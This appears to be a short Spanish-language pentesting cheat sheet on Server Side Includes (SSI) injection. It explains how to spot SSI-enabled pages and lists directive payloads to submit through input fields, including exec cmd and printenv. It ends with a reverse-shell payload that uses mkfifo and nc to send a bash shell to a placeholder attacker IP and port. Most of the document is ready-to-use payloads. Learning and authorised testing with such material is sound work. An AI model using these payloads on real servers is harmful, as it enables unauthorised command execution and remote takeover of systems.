# Server Side Includes SSI

## INTRODUCCION

El lado del servidor incluye (`SSI`) es una tecnología utilizada por las aplicaciones web para crear contenido dinámico en páginas HTML antes de cargarlas o durante el proceso de representación mediante la evaluación de directivas SSI. Algunas directivas de SSI son:

>[!note]
>El uso de SSI en una aplicación web se puede identificar buscando extensiones como .shtml, .shtm o .stm.

Existen configuraciones de servidor no predeterminadas que podrían permitir que otras extensiones (como .html) procesen directivas SSI.

## PAYLOADS

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

Necesitamos enviar cargas útiles a la aplicación de destino, como las mencionadas anteriormente, a través de campos de entrada para probar la inyección de SSI. El servidor web analizará y ejecutará las directivas antes de mostrar la página si hay una vulnerabilidad presente.

>[!note]
>tenga en cuenta que esas vulnerabilidades también pueden existir en formato ciego. 

La inyección SSI exitosa puede conducir a la extracción de información confidencial de archivos locales o incluso a la ejecución de comandos en el servidor web de destino.

### REVERSE SHELL

```html
<!--#exec cmd="mkfifo /tmp/foo;nc <IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```